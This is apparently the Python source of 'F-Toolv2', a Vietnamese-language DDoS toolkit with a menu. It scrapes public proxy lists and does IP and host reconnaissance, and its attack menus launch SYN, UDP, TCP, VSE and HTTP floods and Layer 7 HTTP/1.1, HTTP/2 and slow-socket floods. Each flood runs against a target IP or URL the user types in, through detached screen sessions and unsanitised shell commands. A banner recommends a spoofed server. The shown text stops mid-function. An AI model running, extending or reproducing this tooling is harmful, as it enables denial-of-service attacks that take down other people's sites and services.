#!/usr/bin/env python3
from shutil import which
from urllib import parse
from os import system
import subprocess
import random
import os
import sys
import time
import json
import time
try: #pip3 install httpx requests speedtest colorama
	import speedtest
	import colorama
	import requests
	import httpx
except Exception as e:
	sys.exit(e)


class Color:
	colorama.init(autoreset=True)
	LB = colorama.Fore.LIGHTBLUE_EX
	LC = colorama.Fore.LIGHTCYAN_EX
	LG = colorama.Fore.LIGHTGREEN_EX
	LR = colorama.Fore.LIGHTRED_EX
	LY = colorama.Fore.LIGHTYELLOW_EX
	RESET = colorama.Fore.RESET


class Home:
	def __init__(self,
	help,
	dev):
		self.help = help
		self.dev = dev

	def getproxies(self):
		#self.styleText("\n [*] Đang tải xuống proxy...\n")
		file_name = "utils/http.txt"
		http_proxies = [
			"https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",#copyright by daudau
			"https://www.proxy-list.download/api/v1/get?type=http&anon=elite",
			"https://www.proxy-list.download/api/v1/get?type=http&anon=anonymous"]
		with open(file_name, 'w'):
			for proxies in http_proxies:
				if httpx.get(proxies).status_code == 200:
					with open(file_name, 'a') as p:
						p.write(httpx.get(proxies).text)
	def styleText(self, text):
		for animation in text:
			sys.stdout.write(animation)
			sys.stdout.flush()
			if animation != ".":
				time.sleep(0.01)
			else:
				time.sleep(1)

	def home(self): # đừng chỉnh sửa banner này
		print(f"""
                        {Color.LG}╔════════════════════════╗
    {Color.LC}╔═╗{Color.LB} ╔╦╗╔═╗╔═╗╦      {Color.LG}║ {Color.LR}Created: {Color.LY}5/3/22        {Color.LG}║
    {Color.LC}╠╣{Color.LB}{Color.LR}───{Color.LB}║ ║ ║║ ║║      {Color.LG}║ {Color.LR}Updated: {Color.LY}8/3/22        {Color.LG}║
    {Color.LC}╚{Color.LB}    ╩ ╚═╝╚═╝╩═╝{Color.LG}v2  {Color.LG}║ {Color.LB}Đơn giản nhưng mạnh mẽ {Color.LG}║
                        {Color.LG}╚════════════════════════╝
    {Color.LR}[{Color.LG}>      Được thực hiện bởi FDc0d3         {Color.LG}<{Color.LR}]
    {Color.LR}[{Color.LG}>   Được dịch & phát triển bởi Đậu Đậu   {Color.LG}<{Color.LR}]""")
		print(Color.LC+"    Gõ "+Color.LB+"'HELP'"+Color.LC+" để xem tất cả các lệnh\n\n")
		print(Color.LR+"["+Color.LG+"01"+Color.LR+"]"+Color.LC+" Proxy")
		print(Color.LR+"["+Color.LG+"02"+Color.LR+"]"+Color.LC+" WebTool")
		print(Color.LR+"["+Color.LG+"03"+Color.LR+"]"+Color.LC+" L4/L7/BBoS")
		print(Color.LR+"["+Color.LG+"04"+Color.LR+"]"+Color.LC+" SpeedTest")
		print(Color.LR+"["+Color.LG+"00"+Color.LR+"]"+Color.LC+" Thoát")
		print("\n")
		while True:
			try:
				sys.stdout.write(Color.LB+"╔═══"+Color.LR+"["+Color.LG+"F-Toolv2"+Color.LB+"@"+Color.LG+"Home"+Color.LR+"]"+Color.LB+"\n╚══> "+Color.RESET)#copyright by daudau
				option = input()
				if option in ['01', '1']:
					os.system('clear')
					Tool.proxy(option)
				elif option in ['02', '2']:
					os.system('clear')
					Tool.webtools()
				elif option in ['03', '3']:
					os.system('clear')
					Tool.bbos()
				elif option in ['04', '4']:
					os.system('clear')
					Tool.spdtest()
				elif option in ['ref', 'REF']:
					self.home()
				elif option in ['home', 'HOME']:
					self.home()
				elif option in ['clear', 'CLEAR']:
					os.system('clear');F_Tool.home()
				elif option in ['help', 'HELP', '?']:
					print(self.help)
				elif option in ['dev', 'DEV']:
					print(self.dev)
				elif option in ['exit', 'EXIT']:
					subprocess.run(['pkill -f F-Tool.py'], shell=True)
				elif option in ['stop', 'STOP']:
					subprocess.run(['pkill screen'], shell=True)
					print(f"{Color.LG} [!] tấn công dừng lại!")
				elif option in ['00', '0']:
					subprocess.run(['pkill -f F-Tool.py'], shell=True)
					subprocess.run(['pkill screen'], shell=True)	
				elif option in ['ddos', 'DDOS', 'bbos', 'BBOS']:
					os.system('clear');Tool.bbos()
				elif option == "":
					pass
				else:
					print(Color.LR+"yêu cầu: "+Color.LG+f"{option}"+Color.LR+" không tìm thấy")
			except KeyboardInterrupt:
				sys.exit(0)


class response_url:
	def __init__(self,
	headers):
		self.headers = headers

	def lookup(self, url):
		try:
			if url == '':
				return Color.LG+"["+Color.LR+"!"+Color.LG+"]"+Color.LR+" URL không hợp lệ"
			resp = requests.get(f"http://ip-api.com/json/{url}?fields=status,message,country,countryCode,regionName,city,timezone,asname,isp,org,reverse,query", headers=self.headers).json()
			if resp['status'] == 'success':
				return Color.LG+"    [+] địa chỉ IP: " + resp['query'] + "\n" +Color.LG+ "    [+] Tên máy chủ: " + resp['reverse'] + "\n" +Color.LG+ "    [+] ISP: "+ resp['isp'] + "\n" +Color.LG+ "    [+] Tổ chức: "+ resp['org'] + "\n" +Color.LG+ "    [+] Quốc gia: " + resp['country'] + " " + "(" + resp['countryCode'] + ")" + "\n" +Color.LG+ "    [+] Tên vùng: " + resp['regionName'] + "\n" +Color.LG+ "    [+] Thành phố: " + resp['city'] + "\n" +Color.LG+ "    [+] biệt danh: " + resp['asname'] + "\n" +Color.LG+ "    [+] Múi giờ: " + resp['timezone']#copyright by daudau

			else:
				return Color.LG+"["+Color.LR+"!"+Color.LG+"]"+Color.LR+" URL không hợp lệ"
		except requests.exceptions.ConnectionError:
			return Color.LR+"Lỗi: Kiểm tra kết nối Internet của bạn."

	def ip_lookup(self, ip):
		try:
			if ip == '':
				return Color.LG+"["+Color.LR+"!"+Color.LG+"]"+Color.LR+" Địa chỉ IP không hợp lệ"
			resp = requests.get(f"http://ip-api.com/json/{ip}?fields=status,reverse,message,continent,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,currency,isp,as,mobile,proxy,query,asname", headers=self.headers).json()
			if resp['status'] == 'success':
				return Color.LG+"    [+] Target IP: " + resp['query'] + "\n" +Color.LG+ "    [+] Country: " + resp['continent'] + " " + resp['country'] + " " + "(" + resp['countryCode'] + ")" + "\n" +Color.LG+ "    [+] Region: " + resp['region'] + " " + "(" + resp['regionName'] + ")" + "\n" +Color.LG+ "    [+] City: " + resp['city'] + "\n" +Color.LG+ "    [+] Zipcode: " + resp['zip'] + "\n" +Color.LG+ "    [+] Timezone: " + resp['timezone'] + "\n\n" +Color.LG+ "    [+] ISP: " + resp['isp'] + "\n" +Color.LG+ "    [+] ASN: " + resp['as'] + " " + resp['asname'] + "\n\n" +Color.LG+ "    [+] Mobile: " + str(resp['mobile']) + "\n" +Color.LG+ "    [+] VPN: " + str(resp['proxy'])+ "\n\n" +Color.LG+ "    [+] Google Map: https://www.google.com/maps/place/" + str(resp['lat']) + "," + str(resp['lon'])#copyright by daudau
			else:
				return Color.LG+"["+Color.LR+"!"+Color.LG+"]"+Color.LR+" Địa chỉ IP không hợp lệ"
		except KeyError:
			return Color.LG+"["+Color.LR+"!"+Color.LG+"]"+Color.LR+" Địa chỉ IP không hợp lệ"
		except requests.exceptions.ConnectionError:
			return Color.LR+"Lỗi: Kiểm tra kết nối Internet của bạn."

	def http_status(self, url):
		try:
			if parse.urlparse(url).scheme == "":
				url = "http://"+url
			resp = httpx.get(url, headers=self.headers)
			if resp.status_code == 200:
				return Color.LG+f"    [+] Kết quả: OK | {round(resp.elapsed.total_seconds(), 3)} giây | {resp.status_code} (OK)"
			elif resp.status_code == 301:
				return Color.LG+f"    [+] Kết quả: OK | {round(resp.elapsed.total_seconds(), 3)} giây | {resp.status_code} (Đã di chuyển vĩnh viễn)"
			elif resp.status_code == 302:
				return Color.LG+f"    [+] Kết quả: OK | {round(resp.elapsed.total_seconds(), 3)} giây | {resp.status_code} (Thành lập)"
			elif resp.status_code == 303:
				return Color.LG+f"    [+] Kết quả: OK | {round(resp.elapsed.total_seconds(), 3)} giây | {resp.status_code} (Xem Khác)"
			elif resp.status_code == 307:
				return Color.LG+f"    [+] Kết quả: OK | {round(resp.elapsed.total_seconds(), 3)} giây | {resp.status_code} (Chuyển hướng tạm thời)"
			elif resp.status_code == 400:
				return Color.LR+f"    [+] Kết quả: Lỗi máy chủ | {round(resp.elapsed.total_seconds(), 3)} giây | {resp.status_code} (Không được phép)"
			elif resp.status_code == 410:
				return Color.LG+f"    [+] Kết quả: OK | {round(resp.elapsed.total_seconds(), 3)} giây | {resp.status_code} (Đi mất)"
			elif resp.status_code == 401:
				return Color.LR+f"    [+] Kết quả: Lỗi máy chủ | {round(resp.elapsed.total_seconds(), 3)} giây | {resp.status_code} (Yêu cầu xấu)"
			elif resp.status_code == 403:
				return Color.LR+f"    [+] Kết quả: Lỗi máy chủ | {round(resp.elapsed.total_seconds(), 3)} giây | {resp.status_code} (Cấm)"
			elif resp.status_code == 404:
				return Color.LR+f"    [+] Kết quả: Lỗi máy chủ | {round(resp.elapsed.total_seconds(), 3)} giây | {resp.status_code} (không tìm thấy)"
			elif resp.status_code == 429:
				return Color.LR+f"    [+] Kết quả: Lỗi máy chủ | {round(resp.elapsed.total_seconds(), 3)} giây | {resp.status_code} (Nhiều yêu cầu)"
			elif resp.status_code == 500:
				return Color.LR+f"    [+] Kết quả: Lỗi máy chủ | {round(resp.elapsed.total_seconds(), 3)} giây | {resp.status_code} (Lỗi máy chủ nội bộ)"
			elif resp.status_code == 502:
				return Color.LR+f"    [+] Kết quả: Lỗi máy chủ | {round(resp.elapsed.total_seconds(), 3)} giây | {resp.status_code} (Cổng xấu)"
			elif resp.status_code == 503:
				return Color.LR+f"    [+] Kết quả: Lỗi máy chủ | {round(resp.elapsed.total_seconds(), 3)} giây | {resp.status_code} (dịch vụ Không sẵn có)"
			elif resp.status_code == 504:
				return Color.LR+f"    [+] Kết quả: Lỗi máy chủ | {round(resp.elapsed.total_seconds(), 3)} giây | {resp.status_code} (Cổng Time-out)"
			elif resp.status_code == 507:
				return Color.LR+f"    [+] Kết quả: Lỗi máy chủ | {round(resp.elapsed.total_seconds(), 3)} giây | {resp.status_code} (Không đủ bộ nhớ)"
			elif resp.status_code == 508:
				return Color.LR+f"    [+] Kết quả: Lỗi máy chủ | {round(resp.elapsed.total_seconds(), 3)} giây | {resp.status_code} (Đã phát hiện vòng lặp)"
			else:
				return Color.LR+f"    [+] Kết quả: (Hết thời gian kết nối)"

		except httpx.TimeoutException:
			return Color.LR+f"     [+] Kết quả: (Hết thời gian kết nối)"
		except httpx.ConnectError:
			return Color.LR+f"    [+] Kết quả: Đã xảy ra lỗi"
		except httpx.UnsupportedProtocol:
			return Color.LG+"["+Color.LR+"!"+Color.LG+"]"+Color.LR+" URL không hợp lệ"

	def findhost(self, host):
		try:
			resp = requests.get(f"https://api.hackertarget.com/hostsearch/?q={host}", headers=self.headers)

			if resp.text == 'error invalid host':
				return Color.LG+"["+Color.LR+"!"+Color.LG+"]"+Color.LR+" URL không hợp lệ"
			else:
				return Color.LG+resp.text
		except requests.exceptions.ConnectionError:
			return Color.LR+"Lỗi: Kiểm tra kết nối Internet của bạn."

	def extractlink(self, url):
		try:
			resp = requests.get(f"https://api.hackertarget.com/pagelinks/?q={url}", headers=self.headers)

			if resp.text == "input url is invalid":
				return Color.LG+"["+Color.LR+"!"+Color.LG+"]"+Color.LR+" URL không hợp lệ"
			elif resp.text == "error getting links":
				return Color.LG+"["+Color.LR+"!"+Color.LG+"]"+Color.LR+" Không Tìm Thấy Links!"
			else:
				return Color.LG+resp.text
		except requests.exceptions.ConnectionError:
			return Color.LR+"Lỗi: Kiểm tra kết nối Internet của bạn."


class Tool:
	def __init__(self,
	help,
	dev,
	headers):
		self.help = help
		self.dev = dev
		self.headers = headers

	def proxy(self, new):
		try:
			with open("utils/url.json", 'r') as p:
				readjson = json.loads(p.read())
		except FileNotFoundError:
			sys.exit(f"{Color.LR}LỖI:{Color.RESET} File: 'utils' Không tìm thấy")
		if new in ['ref', 'REF', 'clear', 'CLEAR']:
			os.system('clear')
			F_Tool.styleText("[*] Đang tải xuống Proxy mới...")
		else:
			F_Tool.styleText("[*] Đang tải xuống tất cả proxy...")
		try:
			for proxy in readjson['Proxies']:
				if proxy['type'] == 1:
					if requests.get(proxy["url"]).status_code == 200:
						http = requests.get(proxy["url"], headers=self.headers).text
				if proxy['type'] == 2:
					if requests.get(proxy["url"]).status_code == 200:
						https = requests.get(proxy["url"], headers=self.headers).text
				if proxy['type'] == 3:
					if requests.get(proxy["url"]).status_code == 200:
						socks4 = requests.get(proxy["url"], headers=self.headers).text
				if proxy['type'] == 4:
					if requests.get(proxy["url"]).status_code == 200:
						socks5 = requests.get(proxy["url"], headers=self.headers).text
			os.system('clear')
		except requests.exceptions.ConnectionError:
			sys.exit(Color.LR+"\nLỗi: Kiểm tra kết nối Internet của bạn.")
		print(f"""{Color.LG}

     ___               _
    / _ \_ __ _____  _(_) ___  ___
   / /_)/ '__/ _ \ \/ / |/ _ \/ __|
  / ___/| | | (_) >  <| |  __/\__ )
  \/    |_|  \___/_/\_\_|\___||___/


""")
		print(Color.LR+"["+Color.LG+"01"+Color.LR+"]"+Color.LC+" HTTP PROXY")
		print(Color.LR+"["+Color.LG+"02"+Color.LR+"]"+Color.LC+" HTTPS PROXY")
		print(Color.LR+"["+Color.LG+"03"+Color.LR+"]"+Color.LC+" SOCKS4 PROXY")
		print(Color.LR+"["+Color.LG+"04"+Color.LR+"]"+Color.LC+" SOCKS5 PROXY")
		print(Color.LR+"["+Color.LG+"00"+Color.LR+"]"+Color.LC+" Quay lại")
		print("\n")
		while True:
				sys.stdout.write(Color.LB+"╔═══"+Color.LR+"["+Color.LG+"F-Toolv2"+Color.LB+"@"+Color.LG+"Proxy"+Color.LR+"]"+Color.LB+"\n╚══> "+Color.RESET)
				option = input()
				if option in ['01', '1']:
					with open("http.txt", 'w') as p:
						p.write(http)
					print(Color.LG+"[+]"+Color.LC+" HTTP Đã lưu vào http.txt")
				elif option in ['02', '2']:
					with open("https.txt", 'w') as p:
						p.write(https)
					print(Color.LG+"[+]"+Color.LC+" HTTPS Đã lưu vào https.txt")
				elif option in ['03', '3']:
					with open("socks4.txt", 'w') as p:
						p.write(socks4)
					print(Color.LG+"[+]"+Color.LC+" SOCKS4 Đã lưu vào socks4.txt")
				elif option in ['04', '4']:
					with open("socks5.txt", 'w') as p:
						p.write(socks5)
					print(Color.LG+"[+]"+Color.LC+" SOCKS5 Đã lưu vào socks5.txt")
				elif option in ['ref', 'REF']:
					self.proxy(option)
				elif option in ['home', 'HOME']:
					F_Tool.home()
				elif option in ['clear', 'CLEAR']:
					os.system('clear')
					self.proxy(option)
				elif option in ['help', 'HELP', '?']:
					print(self.help)
				elif option in ['dev', 'DEV']:
					print(self.dev)
				elif option in ['exit', 'EXIT']:
					subprocess.run(['pkill -f F-Tool.py'], shell=True)
				elif option in ['stop', 'STOP']:
					subprocess.run(['pkill screen'], shell=True)
					print(f"{Color.LG} [!] tấn công dừng lại!")
				elif option in ['00', '0']:
					F_Tool.home()	
				elif option in ['ddos', 'DDOS', 'bbos', 'BBOS']:
					os.system('clear');Tool.bbos()
				elif option == "":
					pass
				else:
					print(Color.LR+"yêu cầu: "+Color.LG+f"{option}"+Color.LR+" không tìm thấy")

	def webtools(self):
		print(f"""{Color.LG}

   __    __     _    _____            _
  / / /\ \ \___| |__/__   \___   ___ | |
  \ \/  \/ / _ \ '_ \ / /\/ _ \ / _ \| |
   \  /\  /  __/ |_) / / | (_) | (_) | |
    \/  \/ \___|_.__/\/   \___/ \___/|_|


""")
		print(Color.LR+"["+Color.LG+"01"+Color.LR+"]"+Color.LC+" TRA CỨU")
		print(Color.LR+"["+Color.LG+"02"+Color.LR+"]"+Color.LC+" THÔNG TIN IP")
		print(Color.LR+"["+Color.LG+"03"+Color.LR+"]"+Color.LC+" TRẠNG THÁI HTTP")
		print(Color.LR+"["+Color.LG+"04"+Color.LR+"]"+Color.LC+" TÌM MÁY CHỦ")
		print(Color.LR+"["+Color.LG+"05"+Color.LR+"]"+Color.LC+" TRÍCH LINK")
		print(Color.LR+"["+Color.LG+"00"+Color.LR+"]"+Color.LC+" Quay lại")
		print("\n")
		while True:
			sys.stdout.write(Color.LB+"╔═══"+Color.LR+"["+Color.LG+"F-Toolv2"+Color.LB+"@"+Color.LG+"Webtool"+Color.LR+"]"+Color.LB+"\n╚══> "+Color.RESET)
			option = input()
			if option in ['01', '1']:
				while True:
					lookup = input(Color.LR+"["+Color.LG+"TRA CỨU"+Color.LR+"]"+Color.LC+" Nhập URL mục tiêu: "+Color.RESET)
					parser = parse.urlparse(lookup)
					host = parser.netloc
					if parser.scheme == 'https' or parser.scheme == 'http':
						host = parser.netloc
					elif parser.scheme == '':
						url = "http://"+parser.path
						parser = parse.urlparse(url)
						host = parser.netloc
					print(response_url(self.headers).lookup(host))
					break
			elif option in ['02', '2']:
				while True:
					ip_lookup = input(Color.LR+"["+Color.LG+"THÔNG TIN IP"+Color.LR+"]"+Color.LC+" Nhập IP mục tiêu: "+Color.RESET)
					print(response_url(self.headers).ip_lookup(ip_lookup))
					break
			elif option in ['03', '3']:
				while True:
					http = input(Color.LR+"["+Color.LG+"KIỂM TRA HTTP"+Color.LR+"]"+Color.LC+" Nhập URL mục tiêu: "+Color.RESET)
					print(response_url(self.headers).http_status(http))
					break
			elif option in ['04', '4']:
				while True:
					findhost = input(Color.LR+"["+Color.LG+"TÌM KIẾM"+Color.LR+"]"+Color.LC+" Nhập URL mục tiêu: "+Color.RESET)
					parser = parse.urlparse(findhost)
					host = parser.netloc
					path = parser.path.replace("/", "")
					if parser.scheme == 'https' or parser.scheme == 'http':
						print(response_url(self.headers).findhost(host))
					elif host == '':
						print(response_url(self.headers).findhost(path))
					break
			elif option in ['05', '5']:
				while True:
					excractlink = input(Color.LR+"["+Color.LG+"TRÍCH LINK"+Color.LR+"]"+Color.LC+" Nhập URL mục tiêu: "+Color.RESET)
					print(response_url(self.headers).extractlink(excractlink))
					break
			elif option in ['ref', 'REF']:
				self.webtools()
			elif option in ['home', 'HOME']:
				F_Tool.home()
			elif option in ['clear', 'CLEAR']:
				os.system('clear');self.webtools()
			elif option in ['help', 'HELP', '?']:
				print(self.help)
			elif option in ['dev', 'DEV']:
				print(self.dev)
			elif option in ['exit', 'EXIT']:
				subprocess.run(['pkill -f F-Tool.py'], shell=True)
			elif option in ['stop', 'STOP']:
				subprocess.run(['pkill screen'], shell=True)
				print(f"{Color.LG} [!] tấn công dừng lại!")
			elif option in ['00', '0']:
				F_Tool.home()	
			elif option in ['ddos', 'DDOS', 'bbos', 'BBOS']:
				os.system('clear');Tool.bbos()
			elif option == "":
				pass
			else:
				print(Color.LR+"yêu cầu: "+Color.LG+f"{option}"+Color.LR+" không tìm thấy")

	def spdtest(self):
		print(f"""{Color.LG}

   __                     _ _____          _
  / _\_ __   ___  ___  __| /__   \___  ___| |_
  \ \| '_ \ / _ \/ _ \/ _` | / /\/ _ \/ __| __|
  _\ \ |_) |  __/  __/ (_| |/ / |  __/\__ \ |_
  \__/ .__/ \___|\___|\__,_|\/   \___||___/\__|
     |_|


""")
		try:
			spdt = speedtest.Speedtest()

			print(Color.LC+"[*] Đang tải danh sách máy chủ...")
			spdt.get_servers()
			time.sleep(0.1)

			print(Color.LC+"[*] Chọn máy chủ tốt nhất...")
			get = spdt.get_best_server()
			time.sleep(0.1)

			print(Color.LC+"\n[+] "+Color.LC+"Host:"+Color.LY+f" {get['host']}")
			time.sleep(0.1)
			print(Color.LC+"[+] "+Color.LC+"Vị trí:"+Color.LY+f" {get['name']}")

			print(Color.LC+"\n[*] Thực hiện kiểm tra tải xuống...")
			download_result = spdt.download()

			print(Color.LC+"[*] Thực hiện kiểm tra tải lên...")
			upload_result = spdt.upload()
			ping_result = spdt.results.ping

			time.sleep(0.1)
			print(Color.LC+"\nKết quả:\n")
			time.sleep(0.1)
			print(Color.LC+"[+] Tốc độ tải về:"+Color.LY+f" {download_result / 1024 / 1024:.2f} mbps")
			time.sleep(0.1)
			print(Color.LC+"[+] Tốc độ tải lên:"+Color.LY+f" {upload_result / 1024 / 1024:.2f} mbps")
			time.sleep(0.1)
			print(Color.LC+"[+] Ping:"+Color.LY+f" {ping_result:.2f} ms")
			print("\n")
		except Exception:
			print(Color.LR+"Lỗi: Kiểm tra kết nối Internet của bạn.\n\n")


	def bbos(self):
		print(Color.LR+"\n\n    [>    "+Color.LG+"Vui lòng sử dụng máy chủ giả mạo để có trải nghiệm tốt nhất."+Color.LR+"    <]\n\n")
		print(Color.LR+"["+Color.LG+"01"+Color.LR+"]"+Color.LC+" Layer4")
		print(Color.LR+"["+Color.LG+"02"+Color.LR+"]"+Color.LC+" Layer7")
		print(Color.LR+"["+Color.LG+"00"+Color.LR+"]"+Color.LC+" Quay lại")
		print("\n")
		while True:
			sys.stdout.write(Color.LB+"╔═══"+Color.LR+"["+Color.LG+"F-Toolv2"+Color.LB+"@"+Color.LG+"L4/L7/BBoS"+Color.LR+"]"+Color.LB+"\n╚══> "+Color.RESET)
			option = input()
			if option in ['01', '1']:
				os.system('clear');self.l4()
			elif option in ['02', '2']:
				os.system('clear');self.l7()
			elif option in ['home', 'HOME']:
				F_Tool.home()
			elif option in ['clear', 'CLEAR']:
				os.system('clear');self.bbos()
			elif option in ['help', 'HELP', '?']:
				print(self.help)
			elif option in ['dev', 'Dev']:
				print(self.dev)
			elif option in ['exit', 'EXIT']:
				subprocess.run(['pkill -f F-Tool.py'], shell=True)
			elif option in ['stop', 'STOP']:
				subprocess.run(['pkill screen'], shell=True)
				print(f"{Color.LG} [!] tấn công dừng lại!")
			elif option in ['00', '0']:
				F_Tool.home()	
			elif option in ['ddos', 'DDOS', 'bbos', 'BBOS']:
				os.system('clear');Tool.bbos()
			elif option == "":
				pass
			else:
				print(Color.LR+"yêu cầu: "+Color.LG+f"{option}"+Color.LR+" không tìm thấy")

	def l4(self):
		print(f"""{Color.LG}
     __                       _  _
    / /  __ _ _   _  ___ _ __| || |
   / /  / _` | | | |/ _ \ '__| || |_
  / /__| (_| | |_| |  __/ |  |__   _|
  \____/\__,_|\__, |\___|_|     |_|
              |___/

""")
		print(Color.LR+"["+Color.LG+"01"+Color.LR+"]"+Color.LC+" VSE: UDP Valve Source Động cơ lũ lụt cụ thể")
		print(Color.LR+"["+Color.LG+"02"+Color.LR+"]"+Color.LC+" SYN: Lũ lụt TCP SYN")
		print(Color.LR+"["+Color.LG+"03"+Color.LR+"]"+Color.LC+" TCP: Lũ rác TCP")
		print(Color.LR+"["+Color.LG+"04"+Color.LR+"]"+Color.LC+" UDP: Lũ rác UDP")
		print(Color.LR+"["+Color.LG+"05"+Color.LR+"]"+Color.LC+" HTTP: Lũ yêu cầu HTTP GET")
		print(Color.LR+"["+Color.LG+"00"+Color.LR+"]"+Color.LC+" Quay lại")
		print("\n")
		while True:
			sys.stdout.write(Color.LB+"╔═══"+Color.LR+"["+Color.LG+"F-Toolv2"+Color.LB+"@"+Color.LG+"Layer4"+Color.LR+"]"+Color.LB+"\n╚══> "+Color.RESET)
			option = input()
			if option in ['01', '1']:
				try:
					ip = str(input(f"{Color.LG} [>] IP: "+Color.RESET))
					port = int(input(f"{Color.LG} [>] Port: "+Color.RESET))
					floodtime = int(input(f"{Color.LG} [>] Time: "+Color.RESET))
					thread = int(input(f"{Color.LG} [>] Luồng: "+Color.RESET))
					subprocess.run([f'screen -dm python3 utils/L4/vse {ip} {port} {floodtime} {thread}'], shell=True)
					print(Color.LG+f"\n [!] Tấn công được gửi thành công!\n")
				except:
					print(f"{Color.LR}LỖI: {Color.RESET}Thử lại")
			elif option in ['02', '2']:
				try:
					ip = str(input(f"{Color.LG} [>] IP: "+Color.RESET))
					port = int(input(f"{Color.LG} [>] Port: "+Color.RESET))
					floodtime = int(input(f"{Color.LG} [>] Time: "+Color.RESET))
					thread = int(input(f"{Color.LG} [>] Luồng: "+Color.RESET))
					subprocess.run([f'screen -dm python3 utils/L4/syn {ip} {port} {floodtime} {thread}'], shell=True)
					print(Color.LG+f"\n [!] Tấn công được gửi thành công!\n")
				except:
					print(f"{Color.LR}LỖI: {Color.RESET}Thử lại")
			elif option in ['03', '3']:
				try:
					ip = str(input(f"{Color.LG} [>] IP: "+Color.RESET))
					port = int(input(f"{Color.LG} [>] Port: "+Color.RESET))
					floodtime = int(input(f"{Color.LG} [>] Time: "+Color.RESET))
					size = int(input(f"{Color.LG} [>] Size: "+Color.RESET))
					thread = int(input(f"{Color.LG} [>] Luồng: "+Color.RESET))
					subprocess.run([f'screen -dm python3 utils/L4/tcp {ip} {port} {floodtime} {size} {thread}'], shell=True)
					print(Color.LG+f"\n [!] Tấn công được gửi thành công!\n")
				except:
					print(f"{Color.LR}LỖI: {Color.RESET}Thử lại")
			elif option in ['04', '4']:
				try:
					ip = str(input(f"{Color.LG} [>] IP: "+Color.RESET))
					port = int(input(f"{Color.LG} [>] Port: "+Color.RESET))
					floodtime = int(input(f"{Color.LG} [>] Time: "+Color.RESET))
					size = int(input(f"{Color.LG} [>] Size: "+Color.RESET))
					thread = int(input(f"{Color.LG} [>] Luồng: "+Color.RESET))
					subprocess.run([f'screen -dm python3 utils/L4/udp {ip} {port} {floodtime} {size} {thread}'], shell=True)
					print(Color.LG+f"\n [!] Tấn công được gửi thành công!\n")
				except:
					print(f"{Color.LR}LỖI: {Color.RESET}Thử lại")
			elif option in ['05', '5']:
				try:
					ip = str(input(f"{Color.LG} [>] IP: "+Color.RESET))
					floodtime = int(input(f"{Color.LG} [>] Time: "+Color.RESET))
					thread = int(input(f"{Color.LG} [>] Luồng: "+Color.RESET))
					subprocess.run([f'screen -dm python3 utils/L4/http {ip} {floodtime} {thread}'], shell=True)
					print(Color.LG+f"\n [!] Tấn công được gửi thành công!\n")
				except:
					print(f"{Color.LR}LỖI: {Color.RESET}Thử lại")
			elif option in ['ref', 'REF']:
				self.l4()
			elif option in ['home', 'HOME']:
				F_Tool.home()
			elif option in ['clear', 'CLEAR']:
				os.system('clear');self.l4()
			elif option in ['help', 'HELP', '?']:
				print(self.help)
			elif option in ['dev', 'DEV']:
				print(self.dev)
			elif option in ['exit', 'EXIT']:
				subprocess.run(['pkill -f F-Tool.py'], shell=True)
			elif option in ['stop', 'STOP']:
				subprocess.run(['pkill screen'], shell=True)
				print(f"{Color.LG} [!] tấn công dừng lại!")
			elif option in ['00', '0']:
				os.system('clear');self.bbos()
			elif option in ['ddos', 'DDOS', 'bbos', 'BBOS']:
				os.system('clear');Tool.bbos()
			elif option == "":
				pass
			else:
				print(Color.LR+"yêu cầu: "+Color.LG+f"{option}"+Color.LR+" không tìm thấy")

	def l7(self):
		print(f"""{Color.LG}
     __                      _____
    / /  __ _ _   _  ___ _ _|___  |
   / /  / _` | | | |/ _ \ '__| / /
  / /__| (_| | |_| |  __/ |   / /
  \____/\__,_|\__, |\___|_|  /_/
              |___/

""")
		print(Color.LR+"["+Color.LG+"01"+Color.LR+"]"+Color.LC+" SOCKET: Lũ SOCKET HTTP/1.1 chậm (JS)")
		print(Color.LR+"["+Color.LG+"02"+Color.LR+"]"+Color.LC+" HTTP1: TLS HTTP/1.1 GET lũ lụt (JS)")
		print(Color.LR+"["+Color.LG+"03"+Color.LR+"]"+Color.LC+" HTTP2: TLS HTTP/2 GET lũ lụt (JS)")
		print(Color.LR+"["+Color.LG+"04"+Color.LR+"]"+Color.LC+" CRINGE: Mục tiêu phương pháp mạnh mẽ Có thể chết vì CRINGE (JS)")
		print(Color.LR+"["+Color.LG+"00"+Color.LR+"]"+Color.LC+" Quay lại")
		print("\n")
		while True:
			sys.stdout.write(Color.LB+"╔═══"+Color.LR+"["+Color.LG+"F-Toolv2"+Color.LB+"@"+Color.LG+"Layer7"+Color.LR+"]"+Color.LB+"\n╚══> "+Color.RESET)
			option = input()
			if option in ['01', '1']:
				try:
					url = str(input(f"{Color.LG} [>] URL: "+Color.RESET))
					floodtime = int(input(f"{Color.LG} [>] Time: "+Color.RESET))
					reqs = int(input(f"{Color.LG} [>] Requests(200): "+Color.RESET))
					F_Tool.getproxies();subprocess.run([f'screen -dm node utils/L7/socket {url} utils/http.txt {floodtime} {reqs}'], shell=True)
					print(Color.LG+f"\n [!] Tấn công được gửi thành công!\n")
				except:
					print(f"{Color.LR}LỖI: {Color.RESET}Thử lại")
			elif option in ['02', '2']:
				try:
					url = str(input(f"{Color.LG} [>] URL: "+Color.RESET))
					floodtime = int(input(f"{Color.LG} [>] Time: "+Color.RESET))
					F_Tool.getproxies();subprocess.run([f'screen -dm node utils/L7/https1 GET {url} utils/http.txt {floodtime} 64 1'], shell=True)
					print(Color.LG+f"\n [!] Tấn công được gửi thành công!\n")
				except:
					print(f"{Color.LR}LỖI: {Color.RESET}Thử lại")
			elif option in ['02', '3']:
				try:
					url = str(input(f"{Color.LG} [>] URL: "+Color.RESET))
					floodtime = int(input(f"{Color.LG} [>] Time: "+Color.RESET))
					F_Tool.getproxies();subprocess.run([f'screen -dm node utils/L7/bypass {url} {floodtime}'], shell=True)
					print(Color.LG+f"\n [!] Tấn công được gửi thành công!\n")
				except:
					print(f"{Color.LR}LỖI: {Color.RESET}Thử lại")
			elif option in ['04', '4']:
				try:
					url = str(input(f"{Color.LG} [>] URL: "+Color.RESET))
					floodtime = int(input(f"{Color.LG} [>] Time: "+Color.RESET))
					F_Tool.getproxies();subprocess.run([f'screen -dm node utils/L7/https2 {url} {floodtime} 1'], shell=True)
					print(Color.LG+f"\n [!] Tấn công được gửi thành công!\n")
				except:
					print(f"{Color.LR}LỖI: {Color.RESET}Thử lại")
			elif option in ['ref', 'REF']:
				self.l7()
			elif option in ['home', 'HOME']:
				F_Tool.home()
			elif option in ['clear', 'CLEAR']:
				os.system('clear')
				self.l7()
			elif option in ['help', 'HELP', '?']:
				print(self.help)
